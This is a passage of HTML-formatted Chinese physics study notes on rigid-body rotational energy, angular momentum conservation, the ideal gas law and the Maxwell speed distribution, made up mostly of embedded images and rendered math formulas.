src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648559596335-2ff31b1f-c221-4838-a9e9-064f2e43dd2c.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=567&amp;id=uc301e406&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=709&amp;originWidth=994&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=63101&amp;status=done&amp;style=none&amp;taskId=u4357275e-679e-4928-b513-e0b324f7c15&amp;title=&amp;width=795.2" alt="图片.png"></p><h3 id="刚体的转动动能">刚体的转动动能</h3><p>合外力矩对绕定轴转动的刚体作功等于刚体转动动能的增量。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648559703272-ca8c25eb-f9dc-4d2e-8639-df62346d0a6d.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=153&amp;id=u1dc64b0f&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=191&amp;originWidth=743&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9429&amp;status=done&amp;style=none&amp;taskId=ud6431cea-8348-4519-b31b-d81fc8f6381&amp;title=&amp;width=594.4" alt="图片.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648559795365-1fea4be6-7ee5-498e-81eb-ecf70ad7f908.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=110&amp;id=u432ab3c5&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=137&amp;originWidth=933&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=8593&amp;status=done&amp;style=none&amp;taskId=ud46020e8-d33d-4ff2-a46a-6e8d1afe3eb&amp;title=&amp;width=746.4" alt="图片.png"></p><h2 id="冲量矩-角动量-角动量守恒定律">冲量矩.角动量 角动量守恒定律</h2><h3 id="角动量">角动量</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648563778824-da0c5666-4b69-4f88-840f-3051cec5c221.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=314&amp;id=ufa14c695&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=393&amp;originWidth=700&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=19392&amp;status=done&amp;style=none&amp;taskId=u80ee6e46-00a1-46cb-87b6-a87194434e2&amp;title=&amp;width=560" alt="图片.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648564182376-bbb25181-03ed-41f1-ae53-078ece6a6594.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=471&amp;id=uf5049de2&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=589&amp;originWidth=894&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=35698&amp;status=done&amp;style=none&amp;taskId=ubf401b4d-3949-45d8-91db-db9c06cb8aa&amp;title=&amp;width=715.2" alt="图片.png"></p><h3 id="冲量矩">冲量矩</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648563639697-37b876bd-6d99-431e-9981-f444421038a9.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=209&amp;id=ueeeffc9c&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=261&amp;originWidth=624&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=14538&amp;status=done&amp;style=none&amp;taskId=u0cffa864-7e34-4524-a179-b47c2e68eeb&amp;title=&amp;width=499.2" alt="图片.png"></p><h3 id="角动量定理">角动量定理</h3><p>刚体受到的冲量矩等于刚体角动量的增量。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648564450258-d6ff93d1-0682-45b8-a13b-32f895059cfd.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=62&amp;id=u8b09f41a&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=77&amp;originWidth=764&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=5032&amp;status=done&amp;style=none&amp;taskId=u598e94ba-58d2-4a70-90be-ee280e05a2b&amp;title=&amp;width=611.2" alt="图片.png"></p><h3 id="角动量守恒定律">角动量守恒定律</h3><p>当刚体受到的合外力矩为 0 时，刚体的角动量守恒。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648564552226-cd4e6fff-c43d-46b3-aedd-c10587e698ad.png#clientId=u7aeb2a44-d0e2-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=177&amp;id=ub62d0a2d&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=221&amp;originWidth=302&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=4222&amp;status=done&amp;style=none&amp;taskId=uf0c67286-ba9b-4f77-ab13-a49cbd95081&amp;title=&amp;width=241.6" alt="图片.png"></p><h3 id="讨论">讨论</h3><ol><li>物体绕定轴转动时角动量守恒是指转动惯量和角速度的乘积不变。</li><li>内力矩不改变系统的角动量。</li><li>角动量定理和角动量守恒定律，不仅适用于宏观问题，也适用于原子、原子核等微观问题，角动量守恒定律是自然界的一个基本定律。</li></ol><h1>第三章气体动理论</h1><h2 id="理想气体">理想气体</h2><h3 id="理想气体状态方程">理想气体状态方程</h3><p>理想气体处于热平衡态下时，各状态参量之间的关系。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648602282539-c10544c2-01a0-4a9a-b494-b9c2441c6199.png#clientId=uc34aa108-0f6a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=109&amp;id=u41fb8d51&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=136&amp;originWidth=276&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=3427&amp;status=done&amp;style=none&amp;taskId=ubbffc2f1-b036-4e13-8e00-945f17a0553&amp;title=&amp;width=220.8" alt="图片.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648602399492-7241e4e4-d747-4d0c-bc1c-bc6c885de286.png#clientId=uc34aa108-0f6a-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=350&amp;id=uc40b8eab&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=437&amp;originWidth=931&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=34756&amp;status=done&amp;style=none&amp;taskId=ue33f21e7-d279-4f83-8ab9-720200f1f0d&amp;title=&amp;width=744.8" alt="图片.png"></p><h3 id="状态参量的含义">状态参量的含义</h3><ol><li>压强 P：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi>P</mi><mi>a</mi><mo>=</mo><mn>1</mn><mi>N</mi><mo separator="true">⋅</mo><msup><mi>m</mi><mrow><mo>−</mo><mn>2</mn></mrow></msup></mrow><annotation encoding="application/x-tex">1Pa = 1N·m^{-2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></li><li>体积 V：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mi>m</mi><mn>3</mn></msup><mo>=</mo><mn>1</mn><msup><mn>0</mn><mn>3</mn></msup><mi>l</mi></mrow><annotation encoding="application/x-tex">1m^3  = 10^3 l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span></li><li>温度 T：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>=</mo><mtext>（</mtext><mi>t</mi><mo>+</mo><mn>273</mn><mtext>）</mtext><mi>k</mi></mrow><annotation encoding="application/x-tex">T = （t + 273）k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">273</span><span class="mord cjk_fallback">）</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></li><li>摩尔数：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mfrac><mi>m</mi><msup><mi>m</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mfrac></mrow><annotation encoding="application/x-tex">N = \frac{m}{m&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0404em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li>普适气体常数 R： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>=</mo><mfrac><mrow><msub><mi>p</mi><mn>0</mn></msub><msub><mi>v</mi><mn>0</mn></msub></mrow><msub><mi>T</mi><mn>0</mn></msub></mfrac></mrow><annotation encoding="application/x-tex">R=\frac{p_0v_0}{T_0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1926em;vertical-align:-0.4451em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0359em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4451em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li></ol><h2 id="麦克斯韦速率分布律">麦克斯韦速率分布律</h2><h3 id="速率分布函数">速率分布函数</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648642373751-20c45185-402a-42a0-98b9-547333cfa01b.png#clientId=u17f16ba5-1805-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=290&amp;id=u8d80d2f3&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=362&amp;originWidth=892&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=32481&amp;status=done&amp;style=none&amp;taskId=u8a019dc2-f083-4279-ba84-b29b0f4e39f&amp;title=&amp;width=713.6" alt="图片.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648642448545-d9f20641-7120-4776-982c-557a0e4843c6.png#clientId=u17f16ba5-1805-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=520&amp;id=u4057d887&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=650&amp;originWidth=926&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=47437&amp;status=done&amp;style=none&amp;taskId=ua2762936-1002-4541-9bb4-b22ef7662e5&amp;title=&amp;width=740.8" alt="图片.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648642466668-23589509-33ec-4e6e-9aca-ab211f4b0354.png#clientId=u17f16ba5-1805-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=495&amp;id=u994ef0a7&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=619&amp;originWidth=949&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=48682&amp;status=done&amp;style=none&amp;taskId=u026f3dd3-8724-432e-8c92-68adb7531a4&amp;title=&amp;width=759.2" alt="图片.png"></p><h3 id="麦克斯韦速率分布律的应用">麦克斯韦速率分布律的应用</h3><ol><li>最概然速率 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>p</mi></msub><mo>=</mo><msqrt><mfrac><mrow><mn>2</mn><mi>k</mi><mi>T</mi></mrow><mi>m</mi></mfrac></msqrt><mo>=</mo><msqrt><mfrac><mrow><mn>2</mn><mi>R</mi><mi>T</mi></mrow><mi>M</mi></mfrac></msqrt></mrow><annotation encoding="application/x-tex">v_p=\sqrt \frac{2kT}{m}=\sqrt\frac{2RT}{M}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.5874em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2526em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span style="top:-3.2126em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.88em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5874em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.5913em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2487em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8723em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">RT</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span style="top:-3.2087em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.88em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5913em;"><span></span></span></span></span></span></span></span></span> 表示在该速率下分子出现的概率最大。</li><li>平均速率 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>v</mi><mo>ˉ</mo></mover><mo>=</mo><msqrt><mfrac><mrow><mn>8</mn><mi>R</mi><mi>T</mi></mrow><mrow><mi>π</mi><mi>M</mi></mrow></mfrac></msqrt></mrow><annotation encoding="application/x-tex">\bar v=\sqrt\frac{8RT}{πM}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5678em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2222em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.5913em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2487em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8723em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">π</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">RT</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span style="top:-3.2087em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.88em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.88em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5913em;"><span></span></span></span></span></span></span></span></span></li><li>方均根速率 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><msup><mover accent="true"><mi>v</mi><mo>ˉ</mo></mover><mn>2</mn></msup></msqrt><mo>=</mo><msqrt><mfrac><mrow><mn>3</mn><mi>R</mi><mi>T</mi></mrow><mi>M</mi></mfrac></msqrt></mrow><annotation encoding="application/x-tex">\sqrt {\bar v^2}=\sqrt\frac{3RT}{M}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.0849em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9551em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.2222em;"><span class="mord">ˉ</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7401em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.9151em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.0849em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.5913em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span 